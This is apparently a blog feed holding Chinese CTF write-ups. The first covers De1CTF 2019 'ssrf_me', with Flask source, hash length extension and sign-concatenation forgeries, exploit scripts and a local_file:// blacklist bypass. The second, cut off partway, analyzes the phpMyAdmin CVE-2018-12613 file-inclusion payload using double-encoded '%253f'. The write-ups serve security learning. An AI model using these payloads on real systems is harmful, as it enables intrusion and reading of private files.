    <content type="html"><![CDATA[<p>原帖地址 : <a href="https://xz.aliyun.com/t/5927" target="_blank" rel="noopener">https://xz.aliyun.com/t/5927</a></p><p>De1CTF 2019 的一个题目总结</p><a id="more"></a><h1 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h1><ul><li><p>直接查看页面源代码可以看到正确格式的代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">'latin1'</span>)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, action, param, sign, ip)</span>:</span></span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> os.path.exists(self.sandbox)):          <span class="comment">#SandBox For Remote_Addr</span></span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Exec</span><span class="params">(self)</span>:</span></span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> (self.checkSign()):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"scan"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                tmpfile = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'w'</span>)</span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">"Connection Timeout"</span>):</span><br><span class="line">                    result[<span class="string">'data'</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    print(resp)</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">"read"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                f = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'r'</span>)</span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">'data'</span>] = f.read()</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">'code'</span>] == <span class="number">500</span>:</span><br><span class="line">                result[<span class="string">'data'</span>] = <span class="string">"Action Error"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">'msg'</span>] = <span class="string">"Sign Error"</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">checkSign</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> (getSign(self.action, self.param) == self.sign):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#generate Sign For Action Scan.</span></span><br><span class="line"><span class="meta">@app.route("/geneSign", methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span><span class="params">()</span>:</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))</span><br><span class="line">    action = <span class="string">"scan"</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/De1ta',methods=['GET','POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span><span class="params">()</span>:</span></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">"action"</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">"sign"</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span>(waf(param)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"No Hacker!!!!"</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> open(<span class="string">"code.txt"</span>,<span class="string">"r"</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span><span class="params">(param)</span>:</span></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Connection Timeout"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span><span class="params">(action, param)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(content)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span><span class="params">(param)</span>:</span></span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">"gopher"</span>) <span class="keyword">or</span> check.startswith(<span class="string">"file"</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure></li><li><p>提示给的是 flag 在 ./flag.txt 中，题目单词打错了</p></li><li><p>python 的 flask 框架，三个路由，index 用于获取源码，geneSign 用于生成 md5，De1ta 就是挑战</p></li><li><p>大概思路就是在 /De1ta 中 get param ，cookie action sign 去读取 flag.txt，其中，<code>param=flag.txt</code>，<code>action</code> 中要含有 <code>read</code> 和 <code>scan</code>，且 <code>sign=md5(secert_key + param + action)</code></p></li></ul><h1 id="哈希拓展攻击"><a href="#哈希拓展攻击" class="headerlink" title="哈希拓展攻击"></a>哈希拓展攻击</h1><ul><li><p>这是这道题最多的解法，介绍 : <a href="https://joychou.org/web/hash-length-extension-attack.html" target="_blank" rel="noopener">https://joychou.org/web/hash-length-extension-attack.html</a></p></li><li><p><code>secert_key</code> 是一个长度为 16 的字符串，在 <code>/geneSign?param=flag.txt</code> 中可以获取 <code>md5(secert_key + &#39;flag.txt&#39; + &#39;scan&#39;)</code> 的值，为 <code>8370bdba94bd5aaf7427b84b3f52d7cb</code>，而目标则是获取 <code>md5(secert_key + &#39;flag.txt&#39; + &#39;readscan&#39;)</code> 的值</p></li><li><p>使用 hashpump 即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@peri0d:~/HashPump<span class="comment"># hashpump</span></span><br><span class="line">Input Signature: 8370bdba94bd5aaf7427b84b3f52d7cb</span><br><span class="line">Input Data: scan</span><br><span class="line">Input Key Length: 24</span><br><span class="line">Input Data to Add: <span class="built_in">read</span></span><br><span class="line">d7163f39ab78a698b3514fd465e4018a</span><br><span class="line">scan\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe0\x00\x00\x00\x00\x00\x00\x00read</span><br></pre></td></tr></table></figure></li><li><p>exp : </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://139.180.128.86/De1ta?param=flag.txt'</span></span><br><span class="line"></span><br><span class="line">cookies = &#123;</span><br><span class="line"><span class="string">'sign'</span>: <span class="string">'d7163f39ab78a698b3514fd465e4018a'</span>,</span><br><span class="line"><span class="string">'action'</span>: <span class="string">'scan%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%e0%00%00%00%00%00%00%00read'</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">res = requests.get(url=url, cookies=cookies)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/de1ctf/ssrf_me_3.PNG" alt></p></li></ul><h1 id="字符串拼接"><a href="#字符串拼接" class="headerlink" title="字符串拼接"></a>字符串拼接</h1><ul><li><p>试着访问了一下 <code>/geneSign?param=flag.txt</code> ，给出了一个 md5 <code>8370bdba94bd5aaf7427b84b3f52d7cb</code> ，但是只有 <code>scan</code> 的功能，想加入 <code>read</code> 功能就要另想办法了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span><span class="params">()</span>:</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))</span><br><span class="line">    action = <span class="string">"scan"</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br></pre></td></tr></table></figure></li><li><p>看了一下逻辑，在 getSign 处很有意思，这个字符串拼接的就很有意思了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span><span class="params">(action, param)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br></pre></td></tr></table></figure></li><li><p>不妨假设 <code>secert_key</code> 是 <code>xxx</code> ，那么在开始访问 <code>/geneSign?param=flag.txt</code> 的时候，返回的 md5 就是 <code>md5(&#39;xxx&#39; + &#39;flag.txt&#39; + &#39;scan&#39;)</code> ，在 python 里面上述表达式就相当于 <code>md5(xxxflag.txtscan)</code> ，这就很有意思了。</p></li><li><p>直接构造访问 <code>/geneSign?param=flag.txtread</code> ，拿到的 md5 就是 <code>md5(&#39;xxx&#39; + &#39;flag.txtread&#39; + &#39;scan&#39;)</code> ，等价于 <code>md5(&#39;xxxflag.txtreadscan&#39;)</code> ，这就达到了目标。</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/de1ctf/ssrf_me_1.PNG" alt></p></li><li><p>直接访问 <code>/De1ta?param=flag.txt</code> 构造 cookie <code>action=readscan;sign=7cde191de87fe3ddac26e19acae1525e</code> 即可</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/de1ctf/ssrf_me_2.PNG" alt></p></li></ul><h1 id="local-file"><a href="#local-file" class="headerlink" title="local_file"></a>local_file</h1><ul><li><p>天枢大佬们的做法 : <a href="https://xz.aliyun.com/t/5921#toc-16" target="_blank" rel="noopener">https://xz.aliyun.com/t/5921#toc-16</a></p></li><li><p>放上他们的 exp :</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">conn = requests.Session()</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://139.180.128.86"</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span><span class="params">(param)</span>:</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">"param"</span>: param</span><br><span class="line">    &#125;</span><br><span class="line">    resp = conn.get(url+<span class="string">"/geneSign"</span>,params=data).text</span><br><span class="line">    <span class="keyword">print</span> resp</span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span><span class="params">(action,param,sign)</span>:</span></span><br><span class="line">    cookie=&#123;</span><br><span class="line">        <span class="string">"action"</span>:action,</span><br><span class="line">        <span class="string">"sign"</span>:sign</span><br><span class="line">    &#125;</span><br><span class="line">    params=&#123;</span><br><span class="line">        <span class="string">"param"</span>:param</span><br><span class="line">    &#125;</span><br><span class="line">    resp = conn.get(url+<span class="string">"/De1ta"</span>,params=params,cookies=cookie)</span><br><span class="line">    <span class="keyword">return</span> resp.text</span><br><span class="line">filename = <span class="string">"local_file:///app/flag.txt"</span></span><br><span class="line">a = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>):</span><br><span class="line">    sign = geneSign(<span class="string">"&#123;&#125;read"</span>.format(filename.format(i)))</span><br><span class="line">    resp = challenge(<span class="string">"readscan"</span>,filename.format(i),sign)</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">"title"</span> <span class="keyword">in</span> resp):</span><br><span class="line">        a.append(i)</span><br><span class="line">    <span class="keyword">print</span> resp,i</span><br><span class="line"><span class="keyword">print</span> a</span><br></pre></td></tr></table></figure></li><li><p>请求 <code>/geneSign?param=local_file:///app/flag.txtread</code> 获取 md5 值为 <code>60ff07b83381a35d13caaf2daf583c94</code> ，即 <code>md5(secert_key + &#39;local_file:///app/flag.txtread&#39; + &#39;scan&#39;)</code></p></li><li><p>然后再请求 <code>/De1ta?param=local_file:///app/flag.txt</code> 构造 cookie <code>action=readscan;sign=60ff07b83381a35d13caaf2daf583c94</code> </p></li><li><p>以上就是他们 exp 做的事情，和上一个方法差不多</p></li><li><p>关于 <code>local_file</code> : </p><ul><li><p><a href="https://bugs.python.org/issue35907" target="_blank" rel="noopener">https://bugs.python.org/issue35907</a></p></li><li><p>这里是使用的 urllib.urlopen(param) 去包含的文件，所以可以直接加上文件路径 <code>flag.txt</code> 或 <code>./flag.txt</code> 去访问，也可以使用类似的 <code>file:///app/flag.txt</code> 去访问，但是 <code>file</code> 关键字在黑名单里，可以使用 <code>local_file</code> 代替</p></li><li><p>如果使用 urllib2.urlopen(param) 去包含文件就必须加上 <code>file</code> ，否则会报 <code>ValueError: unknown url type: /path/to/file</code> 的错误</p></li></ul></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;原帖地址 : &lt;a href=&quot;https://xz.aliyun.com/t/5927&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://xz.aliyun.com/t/5927&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;De1CTF 2019 的一个题目总结&lt;/p&gt;
    
    </summary>
    
      <category term="CTF wp" scheme="http://yoursite.com/categories/CTF-wp/"/>
    
    
      <category term="De1CTF" scheme="http://yoursite.com/tags/De1CTF/"/>
    
      <category term="ssrf_me" scheme="http://yoursite.com/tags/ssrf-me/"/>
    
      <category term="wp" scheme="http://yoursite.com/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2018-12613 的一些思考</title>
    <link href="http://yoursite.com/2019/06/28/CVE-2018-12613%20%E5%A4%8D%E7%8E%B0/"/>
    <id>http://yoursite.com/2019/06/28/CVE-2018-12613 复现/</id>
    <published>2019-06-28T11:12:33.661Z</published>
    <updated>2019-08-27T15:37:07.014Z</updated>
    
    <content type="html"><![CDATA[<p>复现 CVE-2018-12613 的一些思考，关于文件包含路径的问题</p><a id="more"></a><h1 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h1><p>/index.php 第 55 行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$target_blacklist = <span class="keyword">array</span> (</span><br><span class="line">    <span class="string">'import.php'</span>, <span class="string">'export.php'</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">'target'</span>])</span><br><span class="line">    &amp;&amp; is_string($_REQUEST[<span class="string">'target'</span>])</span><br><span class="line">    &amp;&amp; ! preg_match(<span class="string">'/^index/'</span>, $_REQUEST[<span class="string">'target'</span>])</span><br><span class="line">    &amp;&amp; ! in_array($_REQUEST[<span class="string">'target'</span>], $target_blacklist)</span><br><span class="line">    &amp;&amp; Core::checkPageValidity($_REQUEST[<span class="string">'target'</span>])</span><br><span class="line">) &#123;</span><br><span class="line">    <span class="keyword">include</span> $_REQUEST[<span class="string">'target'</span>];</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>传入参数 target 需要满足</p><ol><li>不以 index.php 开头</li><li>不在 target_blacklist 中</li><li>通过 checkPageValidity() 函数检验</li></ol><p>checkPageValidity() 函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkPageValidity</span><span class="params">(&amp;$page, array $whitelist = [])</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>($whitelist)) &#123;</span><br><span class="line">            $whitelist = <span class="keyword">self</span>::$goto_whitelist;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $_page = mb_substr(</span><br><span class="line">            $page,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            mb_strpos($page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $_page = urldecode($page);</span><br><span class="line">        $_page = mb_substr(</span><br><span class="line">            $_page,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            mb_strpos($_page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>第一个返回 True 的地方，直接将 page 与 whitelist 比较，传入的必须是白名单里的文件名，无法绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第二个返回 True 的地方，mb_strpos($x, $y) 函数查找 $y 在 $x 中首次出现的位置。mb_substr($str, $start, $length) 函数从 $str 中，截取从 $start 位置开始，长度为 $length 的字符串。</p><p>但是在这里如果直接构造 payload : <code>?target=db_sql.php?/../../../cookie.txt</code> 并不能跨路径包含，? 后面的字符串会被当做传入 db_sql.php 的参数，这就要利用后面的 urldecode 了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$_page = mb_substr(</span><br><span class="line">           $page,</span><br><span class="line">           <span class="number">0</span>,</span><br><span class="line">           mb_strpos($page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">       );</span><br><span class="line"><span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第三个返回 True 的地方，可以利用双重编码绕过，将 ? 经过两次编码 %253f 就可以绕过白名单验证。%253f 传入时，首先会被自动解码一次，变成 %3f，然后urldecode() 再解码一次，就变成了 ?</p><p>此时的 payload : <code>?target=db_sql.php%253f/../../../cookie.txt</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$_page = urldecode($page);</span><br><span class="line">$_page = mb_substr(</span><br><span class="line">         $_page,</span><br><span class="line">          <span class="number">0</span>,</span><br><span class="line">          mb_strpos($_page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">      );</span><br><span class="line"><span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1><ol><li><p><code>include &#39;db_sql.php%253f/../../../cookie.txt&#39;</code> 为什么只会包含 cookie.txt 而不会包含 db_sql.php</p></li><li><p>传入 <code>db_sql.php%253f/../../../cookie.txt</code> 为什么会在 <code>in_array($_page, $whitelist)</code> 处返回 True</p></li><li><p>如图，z.php 中 include 两个 ../ 可以包含，y.php 中一个 include 也可以包含</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/ques/ques_1.png" alt></p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/ques/ques_2.png" alt></p></li><li><p>在 php 的 include 中，<code>include &#39;hint.php?/../cookie.txt&#39;;</code> 会报错，<code>include &#39;hint.php%3f/../cookie.txt&#39;;</code> 不会报错，且可以成功包含</p></li></ol><h1 id="一些解释"><a href="#一些解释" class="headerlink" title="一些解释"></a>一些解释</h1><p>在 include 中，举个例子，假设 <code>x.php</code> 代码包含 <code>include &#39;1source.phps/../cookie.txt&#39;;</code> ，假设 <code>1source.phps</code> 不存在，那么这个文件包含等同于 : 在 <code>1source.phps</code> 文件夹目录下的上一级中的 <code>cookie.txt</code> ，也就是和 <code>x.php</code> 在同一目录下的 <code>cookie.txt</code> ，如果 <code>1source.phps</code> 存在，并且它是一个文件，那么肯定会报错，如果它是一个文件夹，也会成功包含 <code>cookie.txt</code> 。如果变为 <code>include &#39;1source.phps/./cookie.txt&#39;;</code> ，道理和上面相同</p><h1 id="重新思考"><a href="#重新思考" class="headerlink" title="重新思考"></a>重新思考</h1><ul><li><p>代码如下 : </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span 